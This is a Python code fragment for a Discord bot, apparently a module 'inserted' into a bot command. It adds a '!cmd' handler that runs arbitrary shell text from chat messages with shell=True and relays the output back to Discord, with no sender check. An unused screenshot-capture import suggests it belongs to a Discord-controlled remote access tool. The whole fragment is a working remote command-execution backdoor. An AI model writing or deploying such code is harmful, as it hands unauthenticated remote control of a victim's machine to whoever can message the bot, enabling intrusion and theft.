import subprocess
import asyncio
import os
from PIL import ImageGrab
import discord

# ========== MAIN CODE THAT GETS INSERTED INTO THE BOT COMMAND ==========

# This creates a !cmd command for executing shell commands
await ctx.send("🖥️ Executing shell command...")

# Get the command from the message (remove "!cmd " prefix)
if ctx.message.content.startswith('!cmd '):
    command_text = ctx.message.content[5:].strip()
else:
    # Fallback - get everything after first space
    parts = ctx.message.content.split(' ', 1)
    command_text = parts[1] if len(parts) > 1 else ""

if not command_text:
    await ctx.send('```Syntax: !cmd <command>```')
else:
    try:
        # Execute the command
        result = subprocess.run(command_text, capture_output=True, shell=True, text=True, timeout=30)
        cmd_output = result.stdout.strip()
        
        if not cmd_output:
            cmd_output = "Command executed successfully (no output)"
        
        # Send command header
        await ctx.send(f'```Executed command: {command_text}```')
        await ctx.send('```stdout:```')
        
        # Split output into chunks and send
        if len(cmd_output) <= 1900:
            await ctx.send(f'```{cmd_output}```')
        else:
            # Split into chunks that fit Discord's message limit
            chunks = [cmd_output[i:i+1900] for i in range(0, len(cmd_output), 1900)]
            for i, chunk in enumerate(chunks):
                await ctx.send(f'```{chunk}```')
        
        # Send stderr if any
        if result.stderr.strip():
            await ctx.send('```stderr:```')
            stderr_output = result.stderr.strip()
            if len(stderr_output) <= 1900:
                await ctx.send(f'```{stderr_output}```')
            else:
                chunks = [stderr_output[i:i+1900] for i in range(0, len(stderr_output), 1900)]
                for chunk in chunks:
                    await ctx.send(f'```{chunk}```')
        
        # Send footer with return code
        await ctx.send(f'```Command completed with return code: {result.returncode}```')
        
    except subprocess.TimeoutExpired:
        await ctx.send('```Command timed out after 30 seconds```')
    except Exception as e:
        await ctx.send(f'```Error executing command: {str(e)}```')